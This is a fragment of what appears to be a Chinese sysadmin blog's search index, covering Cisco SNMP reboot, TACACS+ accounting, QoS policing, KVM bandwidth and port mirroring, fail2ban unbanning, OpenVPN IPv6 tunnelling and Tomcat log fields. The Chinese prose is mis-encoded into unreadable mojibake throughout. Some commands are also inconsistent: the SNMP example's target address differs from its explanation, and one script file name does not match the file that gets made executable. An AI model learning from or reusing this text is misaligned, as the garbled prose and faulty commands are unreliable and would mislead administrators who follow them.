","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-cisco_snmp3/","series":null,"tags":null,"title":"Cisco Snmpv3çš„è®¾ç½®"},{"categories":null,"content":"è¿™æ˜¯ä¸ªä»€ä¹ˆå‘½é¢˜ï¼Ÿï¼æ²¡åŠæ³•ï¼Œæœ‰æ—¶å€™éœ€è¦ç”¨åˆ°è¿™ç§æ–¹å¼\né¦–å…ˆå»ciscoäº¤æ¢æœºé…ç½®ï¼š\n1snmp-server community private RW 2snmp-server system-shutdown ç„¶ååœ¨linuxæœºå™¨ä¸Šæ‰§è¡Œï¼š\n1# snmpset -v 2c -c private 192.168.1.1 .1.3.6.1.4.1.9.2.9.9.0 i 2 2 3!--- This is an explanation of the variables that this command uses. 4 5 10.16.99.55 = ip address of your router 6 private = R/W SNMP Community string of your router 7.1.3.6.1.4.1.9.2.9.9.0 = tsMsgSend SNMP MIB OID 8 i = Integer as defined SYNTAX in the MIB 9 2 = reload command as defined in the MIB æœ€åï¼ŒFuck Cisco!!!\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-cisco_snmp_reboot/","series":null,"tags":null,"title":"Ciscoäº¤æ¢æœºé€šè¿‡snmpæ¥é‡å¯"},{"categories":null,"content":"æˆ‘ä»¬ç”¨çš„æ˜¯Cisco ASR 1001-Xè¿™ä¸ªè·¯ç”±å™¨æ¥åšBGPçš„ã€‚\nå‰ä¸¤å¤©åšå¤šçº¿BGPçš„æ—¶å€™ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯é‡åˆ°Bugäº†ï¼Œè¿˜æ˜¯æ“ä½œé¡ºåºæœ‰é—®é¢˜ï¼Œå¤§æ–­ç½‘ï¼Œç„¶åé‡å¯è·¯ç”±å™¨ã€‚\näº‹åæƒ³å›é¡¾çš„æ—¶å€™ä¹Ÿæ˜¯å„è‡ªæœ‰å„è‡ªçš„è®°å½•ï¼Œç»†èŠ‚è¯­ç„‰ä¸è¯¦\u0026hellip;\u0026hellip;\nå¹²è„†æ­å»ºä¸€ä¸ªæ—¥å¿—æœåŠ¡å™¨æ¥è®°å½•ä¸‹æ¥æ‰€æœ‰çš„æ“ä½œï¼Œä¾¿äºäº‹åå¤ç›˜\né¦–å…ˆåœ¨CentOS 7 çš„ç³»ç»Ÿä¸Šå®‰è£…TACACS+è½¯ä»¶ï¼Œå±…ç„¶åœ¨7ä¸Šç”¨çš„æ˜¯6çš„è½¯ä»¶ï¼Œè¿™ç‚¹ä¹Ÿå¾ˆæ€ªå¼‚\n1cat \u0026lt;\u0026lt; EOF \u0026gt;/etc/yum.repos.d/tacacs-plus.repo 2[tacacs-plus] 3name=Tacacs Plus 4baseurl=http://li.nux.ro/download/nux/misc/el6/x86_64/ 5enabled=0 6gpgcheck=1 7gpgkey=http://li.nux.ro/download/nux/RPM-GPG-KEY-nux.ro 8EOF å®‰è£…tacacs_plus\n1 yum â€“enablerepo=tacacs-plus install tac_plus æ³¨æ„ï¼Œæˆ‘ä»¬åªæ˜¯ç”¨tacacs_plusæ¥è®°å½•æ“ä½œæ—¥å¿—ï¼Œä¸æ˜¯ç”¨æ¥é™åˆ¶ç”¨æˆ·ç™»å½•å’Œæƒé™çš„ï¼Œæ‰€ä»¥åªéœ€è¦å…³æ³¨ä¸¤è¡Œï¼š\n1vi /etc/tac_plus.conf 2key = \u0026#34;FuckFuckFuck\u0026#34; 3accounting file = /var/log/tac_acct.log 4...... å¯åŠ¨ï¼Œcentos 6 æ²¡æœ‰systemctlï¼Œåªæœ‰service\n1service tac_plus start ok, tacacs+é…ç½®å¥½äº†ï¼Œç»§ç»­ï¼Œå»Ciscoè·¯ç”±å™¨ä¸Šé…\n1Router1#configure terminal 2Enter configuration commands, one per line. End with CNTL/Z. 3Router1(config)#tacacs-server host 192.168.171.13 4Router1(config)#tacacs-server timeout 10 5Router1(config)#tacacs-server key FuckFuckFuck 6Router1(config)#aaa new-model 7Router1(config)#aaa accounting commands 0 default stop-only group tacacs+ 8Router1(config)#aaa accounting commands 1 default stop-only group tacacs+ 9Router1(config)#aaa accounting commands 15 default stop-only group tacacs+ 10Router1(config)#end 11Router1# â€œ0â€ ç”¨æ¥å®¡è®¡exitå’Œendå‘½ä»¤ï¼Œè¿™æ ·å¯ä»¥æ˜ç¡®çŸ¥é“ç”¨æˆ·çš„ç™»å½•ã€‚\nâ€œ1â€ ç”¨æ¥å®¡è®¡éç‰¹æƒç”¨æˆ·çš„showå‘½ä»¤ã€‚\nâ€œ15â€ ç”¨æ¥å®¡è®¡ç‰¹æƒå‘½ä»¤å¯¹è·¯ç”±å™¨é…ç½®çš„æ”¹åŠ¨ã€‚\nçœ‹çœ‹æ—¥å¿—é‡Œæœ‰æ²¡æœ‰è®°å½•ï¼š\næ³¨æ„ï¼Œtacacs-serverçš„è¯­æ³•å¯èƒ½åœ¨iosç‰ˆæœ¬ä¸åŒçš„æƒ…å†µä¸‹è¯­æ³•ä¸åŒï¼š\n1# tacacs server TS-AAA 2 address ipv4 192.168.171.13 3 key FuckFuckFuck 4 timeout 10 ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-cisco_audit/","series":null,"tags":null,"title":"Cisco è·¯ç”±å™¨çš„æ“ä½œå®¡è®¡"},{"categories":null,"content":"éœ€è¦å¼€ä¸€å°kvmçš„æµ‹è¯•æœºï¼Œä½†æ˜¯éœ€è¦é™åˆ¶é€Ÿåº¦ï¼Œ10M\næˆ‘ä»¬çš„ç‰©ç†æœºä½¿ç”¨äº†bridgeï¼Œä»¥åŠvlan tagï¼Œæ‰€ä»¥è™šæœºçš„ç½‘å¡æ˜¯br0.141\næŸ¥äº†ä¸€åœˆæ–‡æ¡£\n1 \u0026lt;interface type=\u0026#39;bridge\u0026#39;\u0026gt; 2 \u0026lt;mac address=\u0026#39;52:54:00:db:4c:5f\u0026#39;/\u0026gt; 3 \u0026lt;source bridge=\u0026#39;br0.141\u0026#39;/\u0026gt; 4 \u0026lt;bandwidth\u0026gt; 5 \u0026lt;inbound average=\u0026#39;1250\u0026#39; peak=\u0026#39;1250\u0026#39; burst=\u0026#39;1250\u0026#39;/\u0026gt; 6 \u0026lt;outbound average=\u0026#39;1250\u0026#39; peak=\u0026#39;1250\u0026#39; burst=\u0026#39;1250\u0026#39;/\u0026gt; 7 \u0026lt;/bandwidth\u0026gt; 8 \u0026lt;model type=\u0026#39;virtio\u0026#39;/\u0026gt; æ³¨æ„é™é€Ÿçš„å•ä½ï¼šæ˜¯kilobyte per second\né‚£ä¹ˆï¼š\n1250 kilobyte per second, KB/s = 10 Mbps = 1.25 MB/s\n10 Mbpså°±æ˜¯é€šå¸¸æ„ä¹‰ä¸Šçš„ç½‘é€Ÿï¼Œ/8=1.25 MB/sï¼Œå°±æ˜¯æœºå™¨ä¸Šç”¨ä¸‹è½½è½¯ä»¶æ¯”å¦‚è¿…é›·ä¸‹è½½ï¼Œçœ‹åˆ°çš„é€Ÿåº¦ï¼ˆ1.25 MB/sï¼‰ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-kvm_limit_bandwidth/","series":null,"tags":null,"title":"KVMçš„è™šæœºå¦‚ä½•é™é€Ÿ"},{"categories":null,"content":"è¯‰æ±‚å¾ˆç®€å•ï¼Œå¯¹å®¢æˆ·é™é€Ÿï¼Œé‚£ä¹ˆéº»çƒ¦å°±å¾ˆå¤šï¼Œæ€ä¹ˆé™ï¼Ÿ\nå…ˆæ™®åŠä¸€ä¸‹Ciscoçš„qosçŸ¥è¯†\nå•é€Ÿå•æ¡¶ï¼š å•é€Ÿå•æ¡¶æ¨¡å¼ä¸å…è®¸æµé‡çªå‘ï¼Œå½“ç”¨æˆ·çš„æµé‡é€Ÿç‡å°äºé…ç½®çš„CIRæ—¶ï¼ŒæŠ¥æ–‡è¢«è®¤ä¸ºæ˜¯conformï¼›å½“ç”¨æˆ·çš„æµé‡å¤§äºCIRæ—¶ç›´æ¥è¢«è®¤ä¸ºæ˜¯exceed(æ€ç§‘exceedåä¸ºviolate)ã€‚\n(å›¾ä¸­Tcä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bc)\n1å¦‚æœåªé…ç½®CIRï¼Œä¸æŒ‡å®šBcï¼Œé‚£ä¹ˆé»˜è®¤Bcç­‰äº1500bytesæˆ–è€… CIRæ•°å€¼ / 32 2 class 100 3 police 8000 conform-action transmit exceed-action drop 4 class 200 5 police cir 8000 conform-action transmit exceed-action drop 6 class 300 7 police 8000 1500 conform-action transmit exceed-action drop 8 class 400 9 police cir 8000 bc 1500 conform-action transmit exceed-action drop å•é€ŸåŒæ¡¶ï¼š æ”¯æŒçªå‘æµé‡ï¼Œç”¨æˆ·çš„æµé‡ä¼šå‡ºç°ä¸‰ç§ç»“æœï¼š\n(å›¾ä¸­Tcã€Teä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSï¼ŒEBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bcã€Be)\nå°äºæˆ–ç­‰äºCIRï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆCIRï¼‰ ï¼ˆconformï¼‰ å¤§äºCIRå¹¶å°äºæˆ–ç­‰äºCIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆexceedï¼‰ è¶…è¿‡CIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯è¶…è¿‡ä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆviolateï¼‰\n1å¦‚æœåªé…ç½®CIRã€Bcï¼Œä¸æŒ‡å®šBeï¼Œé‚£ä¹ˆé»˜è®¤Beç­‰äº1500bytesæˆ–è€…CIRæ•°å€¼ / 32ã€‚ 2 class 500 3 police 8000 1000 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop 4 class 600 5 police 8000 1000 1300 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop 6 class 700 7 police cir 8000 bc 1000 be 1300 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop åŒé€ŸåŒæ¡¶ï¼š (å›¾ä¸­Tcã€Tpä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSï¼ŒPBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bcã€Be)\n1class 800 2 police cir 8000 bc 1000 pir 8000 be 1200 conform-action transmit exceed-action transmit violate-action drop å¥½ï¼Œç½—å—¦äº†è¿™ä¹ˆå¤šã€‚æ³¨æ„ï¼Œæœ‰å¯èƒ½Ciscoçš„äº¤æ¢æœºä¸æ”¯æŒæœ€å¤æ‚çš„1rateï¼Œthree colorï¼Œæ‰€ä»¥ä½ å°±å¾—æ›´æ¢å¦å¤–ä¸¤ç§æ–¹å¼äº†ã€‚\nå®æˆ˜æ¥ä¸€ä¸‹ï¼š\n1policy-map LIMIT-50mbit 2 class class-default 3 police cir 50000000 bc 5000000 be 15000000 conform-action transmit exceed-action set-prec-transmit 3 violate-action set-prec-transmit 2 cirä¸ºæ‰¿è¯ºçš„å¸¦å®½é€Ÿç‡ï¼Œå³éœ€è¦ä¿è¯çš„å¸¦å®½é€Ÿç‡ï¼Œå•ä½ä¸ºbpsï¼›\nbcä¸ºæ™®é€šçªå‘ï¼Œå•ä½ä¸ºbytesï¼›\nbeä¸ºæœ€é«˜çªå‘ï¼Œå•ä½ä¸ºbytesï¼›\nset-prec-transmitï¼Œè¡¨ç¤ºè®¾ç½®IPä¼˜å…ˆçº§å¹¶è½¬å‘æ•°æ®åŒ…ï¼›\næ³¨æ„cirå’Œbcã€beçš„å•ä½æ˜¯ä¸åŒçš„ï¼Œbcå’Œbeéœ€è¦Ã—8ï¼Œç®€å•ç®—å°±æ˜¯Ã—10ï¼›\nä¸Šé¢æ•´ä½“å‘½ä»¤è§£é‡Šä¸ºï¼šæ‰¿è¯ºå¸¦å®½50Mbpsï¼Œæ™®é€šçªå‘ä¸º5Mbytesï¼Œæœ€é«˜çªå‘ä¸º15Mbytesã€‚å½“é€Ÿç‡å°äº100Mbpsï¼ˆ50+50ï¼‰æ˜¯è½¬å‘æ•°æ®åŒ…ï¼Œå½“è¶…è¿‡100Mbpså°äº200Mbpsï¼ˆ50+150ï¼‰æ˜¯é‡å†™IPä¼˜å…ˆçº§ä¸º3å¹¶è½¬å‘æ•°æ®åŒ…ï¼Œå½“è¶…è¿‡200Mbpsæ˜¯é‡å†™IPä¼˜å…ˆçº§ä¸º2å¹¶è½¬å‘æ•°æ®åŒ…ã€‚\nå¯ä»¥å˜ç§ä¸€ä¸‹ï¼Œè¶…äº†100å…†ç›´æ¥drop\n1 police cir 50000000 bc 5000000 be 15000000 conform-action transmit exceed-action drop æœ€ååœ¨ç«¯å£åº”ç”¨ä¸€ä¸‹ç­–ç•¥å³å¯ï¼š\n1interface GigabitEthernet1/0/22 2 description uplink: uplink [50Mbps-200Mbps] 3 switchport access vlan 111 4 switchport mode access 5 storm-control broadcast level 1.00 6 storm-control multicast level 5.00 7 storm-control action shutdown 8 spanning-tree portfast 9 spanning-tree bpdufilter enable 10 spanning-tree bpduguard enable 11 service-policy input LIMIT-50mbit 12 service-policy output LIMIT-50mbit 13! ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-cisco_qos/","series":null,"tags":null,"title":"Ciscoè·¯ç”±å™¨ä¸Šqosçš„è®¾ç½®"},{"categories":null,"content":"ä½œä¸ºä¸€ä¸ªè¿ç»´ï¼Œç°åœ¨æèµ·äº†Cisoçš„BGPç”Ÿæ„\nåœ¨Cisco3650ä¸Šå®šä¹‰VRFï¼Œç»“æœæŠ¥é”™ï¼Œä¸€å¤´é›¾æ°´å•Šï¼Œè€Œä¸”å¯¹Ciscoä¹Ÿä¸ç†Ÿæ‚‰å•Šã€‚\n1#vrf definition mgmt 2% Feature is not supported æ²¡åŠæ³•æœGoogleå•Šï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\n1sh license right-to-use 2license right-to-use activate ipservices all 3reload 4license right-to-use activate ipservices all acceptEULA 5reload æœ€åæ˜¾ç¤ºipserviceså’Œlanbaseéƒ½æœ‰å°±è¡Œäº†\n1#sh license right-to-use 2 Slot# License name Type Count Period left 3---------------------------------------------------------- 4 1 ipservices permanent N/A Lifetime 5 1 lanbase permanent N/A Lifetime ","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-vrf/","series":null,"tags":null,"title":"Cisco Vrfé”™è¯¯ä¹‹the Feature Does Not Supported"},{"categories":null,"content":"ç”±äºå¤§æBGPçº¿è·¯ï¼Œæ‰€ä»¥åœ¨Ciscoè·¯ç”±å™¨ä¸ŠMirroräº†å…¥å£çš„æµé‡åˆ°å¦å¤–ä¸€ä¸ªç«¯å£ï¼Œä¾›suricataåˆ†æç”¨ã€‚\nåœ¨Mirrorç›´é€škvmè™šæœºè¿‡ç¨‹ä¸­é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼š\nMirrorçš„å£æ˜¯Teå£ï¼Œ10Gçš„æµé‡ï¼Œåœ¨å®¿ä¸»æœºä¸Štcpdumpå¯ä»¥çœ‹åˆ°æ‰€æœ‰æµé‡ï¼Œä½†æ˜¯åœ¨kvmä¸Šåˆ™æ–­æ–­ç»­ç»­ï¼Œæµé‡ä¸¢å¤±ä¸€éƒ¨åˆ†ï¼ŒåŸå› å¾ˆç®€å•ï¼š\næµé‡çš„èšåˆå’Œè½¬å‘æœªé…ç½®å¥½ï¼Œä¸¤æ¡å‘½ä»¤è§£å†³\n1brctl setageing br2 0 2brctl setfd br2 0 ä½†æ˜¯ï¼Œå¦‚ä½•åœ¨å®¿ä¸»æœºå¯åŠ¨çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œè¿™ä¸¤å¥å‘¢ï¼Ÿç®€å•ï¼Œå¦‚æœç³»ç»Ÿæ˜¯CentOS\n1cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/sbin/ifup-local 2#!/bin/bash 3brctl setageing br2 0 4brctl setfd br2 0 5EOF 6chmod 755 /sbin/ifup-local å¦‚æœç³»ç»Ÿæ˜¯Ubuntu\n1cd /etc/network/if-up.d 2cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;br3-mirror 3#!/bin/bash 4if [ \u0026#34;$IFACE\u0026#34; = br2 ]; then 5brctl setageing br2 0 6brctl setfd br2 0 7fi 8EOF 9chmod +x br2-mirror åœ¨å®¿ä¸»æœºä¸Šé—®é¢˜è§£å†³äº†ï¼Œåœ¨kvmè™šæœºä¸Šåˆé‡åˆ°é—®é¢˜ï¼ŒUbuntuï¼Œå¦‚æœè®©ä¸€ä¸ªç½‘å£å¯åŠ¨ä½†æ²¡æœ‰åœ°å€å‘¢ï¼Ÿ\n1vi /etc/network/interfaces 2auto ens7 3iface ens7 inet manual 4 mtu 1464 5up ifconfig ens7 up æ³¨æ„ä¸Šé¢çš„ï¼Œens7å°±æ˜¯mirrorè¿‡æ¥çš„ç½‘å£ï¼Œmtuæ˜¯å› ä¸ºåœ¨ciscoåšmirrorçš„æ—¶å€™æŒ‡å®šäº†å›ºå®šçš„mtu 1464.\nbrctlå‘½ä»¤çš„ç”¨æ³•å¯ä»¥å‚è§ä»¥ä¸‹é“¾æ¥ï¼š\nhttps://www.thegeekstuff.com/2017/06/brctl-bridge/ over.\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-kvm_mirror/","series":null,"tags":null,"title":"Mirror å£ç›´é€šåˆ°Kvmä¸­å»é‡åˆ°çš„å‡ ä¸ªé—®é¢˜"},{"categories":null,"content":"mouse çš„æœåŠ¡å™¨è¿æ¥åˆ°äº†å„ä¸ªç½‘ç»œæ ¸å¿ƒè®¾å¤‡ï¼Œæ‰€ä»¥é‡‡ç”¨äº†å¾ˆä¸¥æ ¼çš„ipé™åˆ¶ï¼Œporté™åˆ¶ï¼Œä»¥åŠfail2banæ¥é˜»æ­¢éæ³•è®¿é—®ï¼Œä½†æ˜¯ä¸å·§ï¼ŒæŠŠè‡ªå·±ä¹Ÿç»™æåˆ° jail é‡Œå»äº†ã€‚\né‚£ä¹ˆæ€ä¹ˆè§£å‘¢ï¼Ÿ\né¦–å…ˆæŸ¥çœ‹å°é”æƒ…å†µï¼š\n1fail2ban-client status 2 3Status 4|- Number of jail: 2 5`- Jail list: sshd, sshd-ddos æœ‰ä¸¤ä¸ªjailï¼Œsshdå’Œsshd-ddos\nè¿›ä¸€æ­¥æŸ¥çœ‹ï¼š\n1fail2ban-client status sshd å‘ç°è‡ªå·±è¢«å±è”½äº†ã€‚\nè§£å°çš„æ–¹æ³•ï¼š\n1fail2ban-client set sshd unbanip 103.108.236.5 è§£å°åªæ˜¯ä¸´æ—¶çš„ï¼Œæ°¸ä¹…æ”¾å…¥ç™½åå•æœ€é è°±ï¼š\n1vi /etc/fail2ban/jail.conf 2ignoreip = 103.108.236.5/32 é‡å¯fail2ban\n1systemctl restart fail2ban è¿™æ ·å°±okäº†ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-fail2ban_unban/","series":null,"tags":null,"title":"Fail2banæ€ä¹ˆè§£æ”¾å¹¶æ”¾å…¥ç™½åå•"},{"categories":null,"content":"å…ˆæ™®åŠä¸€ä¸‹IPv6 åœ°å€ã€‚\nIPv6 åœ°å€å¤§å°ä¸º 128 ä½ã€‚\né¦–é€‰ IPv6 åœ°å€è¡¨ç¤ºæ³•ä¸º8ç»„æ•°å­—ç”¨å†’å·åˆ†éš”ï¼Œå…¶ä¸­æ¯ç»„æ˜¯ 8 ä¸ª 16 ä½éƒ¨åˆ†çš„åå…­è¿›åˆ¶å€¼ã€‚IPv6 åœ°å€èŒƒå›´ä» 0000:0000:0000:0000:0000:0000:0000:0000 è‡³ ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffã€‚\né™¤æ­¤é¦–é€‰æ ¼å¼ä¹‹å¤–ï¼ŒIPv6 åœ°å€è¿˜å¯ä»¥ç”¨å…¶ä»–ä¸¤ç§çŸ­æ ¼å¼æŒ‡å®šï¼š\nçœç•¥å‰å¯¼é›¶ é€šè¿‡çœç•¥å‰å¯¼é›¶æŒ‡å®š IPv6 åœ°å€ã€‚ ä¾‹å¦‚ï¼ŒIPv6 åœ°å€ 1050:0000:0000:0000:0005:0600:300c:326b å¯å†™ä½œ 1050:0:0:0:5:600:300c:326bã€‚ åŒå†’å· é€šè¿‡ä½¿ç”¨åŒå†’å·ï¼ˆ::ï¼‰æ›¿æ¢ä¸€ç³»åˆ—é›¶æ¥æŒ‡å®š IPv6 åœ°å€ã€‚ ä¾‹å¦‚ï¼ŒIPv6 åœ°å€ ff06:0:0:0:0:0:0:c3 å¯å†™ä½œ ff06::c3ã€‚ ä¸€ä¸ª IP åœ°å€ä¸­åªå¯ä½¿ç”¨ä¸€æ¬¡åŒå†’å·ã€‚ åœ¨ä¸€èˆ¬IPv6ç½‘ç»œç¯å¢ƒä¸‹ï¼Œä¸€ä¸ªå±€åŸŸç½‘çš„å­ç½‘å¤§å°ä¸º/64ï¼Œæ¥å£é€šè¿‡NDPåè®®è·å¾—è‡ªå·±çš„å”¯ä¸€IPv6åœ°å€ï¼ˆå‰64ä½ä¸ºå­ç½‘å‰ç¼€ï¼Œå64ä½ä¸€èˆ¬ç”±æ¥å£æœ¬èº«çš„MACåœ°å€äº§ç”Ÿï¼‰\næˆ‘ä»¬çš„åœºæ™¯ï¼š\næœåŠ¡å™¨çš„IPV4åœ°å€æ˜¯ 1.2.3.4 æœåŠ¡å™¨çš„IPV6åœ°å€æ˜¯ aaaa:bbbb:cccc:dddd::/64 IPV4å’ŒIPV6çš„åœ°å€éƒ½åœ¨eth0ä¸Š VPNåˆ†é…ç»™å®¢æˆ·ç«¯çš„IPV6åœ°å€æ˜¯aaaa:bbbb:cccc:dddd:80::/112ï¼Œä½¿ç”¨çš„æ¥å£æ˜¯tun0 é…ç½®è¿‡ç¨‹å¦‚ä¸‹ï¼š é¦–å…ˆä¿®æ”¹/etc/sysctl.confæ–‡ä»¶\n1net.ipv4.ip_forward=1 2 ... 3net.ipv6.conf.all.forwarding=1 4net.ipv6.conf.all.proxy_ndp = 1 5 ... 6net.ipv4.conf.all.accept_redirects = 0 7net.ipv6.conf.all.accept_redirects = 0 8 ... 9net.ipv4.conf.all.send_redirects = 0 æ¥ä¸‹æ¥ï¼Œå¯ä»¥å…ˆåšiptableï¼Œä½¿å¾—openvpn serverå¯¹åŒ…è¿›è¡ŒSNAT\n1iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 2æˆ–è€… 3iptables -t nat -A POSTROUTING -s 10.11.0.0/16 -j SNAT --to 172.16.8.1 ç¼–è¾‘/etc/openvpn/variableså˜é‡\n1# å®¢æˆ·ç«¯IPæ®µå‰ç¼€ 2# Tunnel subnet prefix 3prefix=aaaa:bbbb:cccc:dddd:80: 4# netmask 5prefixlen=112 å‡†å¤‡ä¸¤ä¸ªè„šæœ¬ï¼Œåœ¨ä¸å®¢æˆ·ç«¯å»ºç«‹è¿æ¥å’Œæ–­å¼€è¿æ¥æ—¶æ‰§è¡Œï¼Œç”¨æ¥å»ºç«‹æˆ–è€…å–æ¶ˆNDP proxy rulesã€‚ /etc/openvpn/up.sh\n1#!/bin/sh 2 3# Check client variables 4if [ -z \u0026#34;$ifconfig_pool_remote_ip\u0026#34; ] || [ -z \u0026#34;$common_name\u0026#34; ]; then 5 echo \u0026#34;Missing environment variable.\u0026#34; 6 exit 1 7fi 8 9# Load server variables 10. /etc/openvpn/variables 11 12ipv6=\u0026#34;\u0026#34; 13 14ipp=$(echo \u0026#34;$ifconfig_pool_remote_ip\u0026#34; | cut -d. -f4) 15if ! [ \u0026#34;$ipp\u0026#34; -ge 2 -a \u0026#34;$ipp\u0026#34; -le 254 ] 2\u0026gt;/dev/null; then 16 echo \u0026#34;Invalid IPv4 part.\u0026#34; 17 exit 1 18fi 19hexipp=$(printf \u0026#39;%x\u0026#39; $ipp) 20ipv6=\u0026#34;$prefix$hexipp\u0026#34; 21 22# Create proxy rule 23/sbin/ip -6 neigh add proxy $ipv6 dev eth0 /etc/openvpn/down.sh\n1#!/bin/sh 2 3# Check client variables 4if [ -z \u0026#34;$ifconfig_pool_remote_ip\u0026#34; ] || [ -z \u0026#34;$common_name\u0026#34; ]; then 5 echo \u0026#34;Missing environment variable.\u0026#34; 6 exit 1 7fi 8 9# Load server variables 10. /etc/openvpn/variables 11 12ipv6=\u0026#34;\u0026#34; 13 14ipp=$(echo \u0026#34;$ifconfig_pool_remote_ip\u0026#34; | cut -d. -f4) 15if ! [ \u0026#34;$ipp\u0026#34; -ge 2 -a \u0026#34;$ipp\u0026#34; -le 254 ] 2\u0026gt;/dev/null; then 16 echo \u0026#34;Invalid IPv4 part.\u0026#34; 17 exit 1 18fi 19hexipp=$(printf \u0026#39;%x\u0026#39; $ipp) 20ipv6=\u0026#34;$prefix$hexipp\u0026#34; 21 22# Delete proxy rule 23/sbin/ip -6 neigh del proxy $ipv6 dev eth0 è¿™ä¸¤ä¸ªè„šæœ¬æƒé™åº”è¯¥éƒ½æ˜¯755\næœåŠ¡å™¨ç«¯server.confä¸­çš„ç›¸å…³é…ç½®ï¼š\n1# Run client-specific script on connection and disconnection 2script-security 2 3client-connect \u0026#34;/etc/openvpn/up.sh\u0026#34; 4client-disconnect \u0026#34;/etc/openvpn/down.sh\u0026#34; 5 6# Server mode and client subnets 7server 10.8.0.0 255.255.255.0 8server-ipv6 aaaa:bbbb:cccc:dddd:80::/112 9topology subnet 10 11# IPv6 routes 12push \u0026#34;route-ipv6 aaaa:bbbb:cccc:dddd::/64\u0026#34; 13push \u0026#34;route-ipv6 2000::/3\u0026#34; å®¢æˆ·ç«¯client.ovpnä¸­çš„ç›¸å…³é…ç½®\n1remote 1.2.3.4 1194 å¯åŠ¨æœåŠ¡å™¨ç«¯ï¼Œç„¶åå†å¯åŠ¨å®¢æˆ·ç«¯è¿æ¥ æµ‹è¯•ä¸€ä¸‹ï¼š\n1 traceroute6 ipv6.google.com è¿™æ ·å°±okäº†ã€‚\n","date":"2024-01-24","img":"","permalink":"https://rendoumi.com/posts/20240124-vpn_ipv6_ipv4/","series":null,"tags":null,"title":"é…ç½®ä¸€ä¸ªæä¾›IPv6 Tunnel Over IPv4çš„OpenVPNæœåŠ¡å™¨"},{"categories":null,"content":"æˆ‘ä»¬tomcatçš„æ—¥å¿—è®°å½•æ ¼å¼ä¸ºï¼š\n1pattern=\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; resolveHosts=\u0026#34;false\u0026#34;/\u0026gt; éƒ½æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ\n%a - Remote IP address %A - Local IP address %b - Bytes sent, excluding HTTP headers, or \u0026lsquo;-\u0026rsquo; if zero %B - Bytes sent, excluding HTTP headers %h - Remote host name (or IP address if resolveHosts is false) %H - Request protocol %l - Remote logical username from identd (always returns \u0026lsquo;-\u0026rsquo;) %m - Request method (GET, POST, etc.) %p - Local port on which this request was received %q - Query string (prepended with a \u0026lsquo;?\u0026rsquo; if it exists) %r - First line of the request (method and request URI) %s - HTTP status code of the response %S - User session ID %t - Date and time, in Common Log Format %u - Remote user that was authenticated (if any), else \u0026lsquo;-\u0026rsquo; %U - Requested URL path %v - Local server name %D - Time taken to process the request, in millis %T - Time taken to process the request, in seconds %I - Current request thread name (can compare later with stacktraces) å¦å¤–ï¼Œè¿˜å¯ä»¥å°†requestè¯·æ±‚çš„æŸ¥è¯¢å‚æ•°ã€sessionä¼šè¯å˜é‡å€¼ã€cookieå€¼æˆ–HTTPè¯·æ±‚/å“åº”å¤´å†…å®¹çš„å˜é‡å€¼ç­‰å†…å®¹å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ã€‚\nå®ƒä»¿ç…§äº†apacheçš„è¯­æ³•ï¼š\nï¼…{XXX}i xxxä»£è¡¨ä¼ å…¥çš„å¤´(HTTP Request) ï¼…{XXX}o xxxä»£è¡¨ä¼ å‡ºçš„å“åº”å¤´(Http Resonse) ï¼…{XXX}c xxxä»£è¡¨ç‰¹å®šçš„Cookieå ï¼…{XXX}r xxxä»£è¡¨ServletRequestå±æ€§å ï¼…{XXX}s xxxä»£è¡¨HttpSessionä¸­çš„å±æ€§å 1\u0026#34;%a|%A|%T|%{X-Forwarded-For}i|%l|%u|%t|%r|%s|%b|%{Referer}i|%{User-Agent}i \u0026#34; ç¿»è¯‘è¿‡æ¥å°±æ˜¯\n1\u0026#34;è¿œç¨‹åœ°å€|æœ¬åœ°åœ°å€|å“åº”æ—¶é—´|X-Forwarded-For|è¿œç¨‹ç”¨æˆ·|è¿œç¨‹è®¤è¯ç”¨æˆ·|æ—¶é—´|ç¬¬ä¸€è¡Œ|å›åº”code|å‘é€å­—èŠ‚|Referer|User-Agent \u0026#34; ä¾‹å­ï¼š\n110.11.9.190|10.11.10.13|0.153|111.199.189.182|-|-|[04/May/2018:21:31:02 +0800]|GET /cms/rest.htm?v=1.0 HTTP/1.0|200|48939|-|Dalvik/2.1.0 (Linux; U; Android 7.0; PIC-AL00 Build/HUAWEIPIC-AL00) è¿™æ 